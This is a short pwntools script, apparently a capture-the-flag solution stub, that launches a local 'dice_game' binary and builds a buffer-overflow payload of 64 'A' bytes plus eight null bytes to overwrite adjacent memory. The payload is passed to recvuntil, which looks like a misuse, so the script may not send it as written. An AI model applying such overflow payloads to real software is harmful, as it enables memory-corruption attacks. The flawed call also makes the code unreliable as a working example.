from pwn import *
p = process("./dice_game")
payload = "A"*0x40 + "\x00"*8
p.recvuntil('name: ',payload)

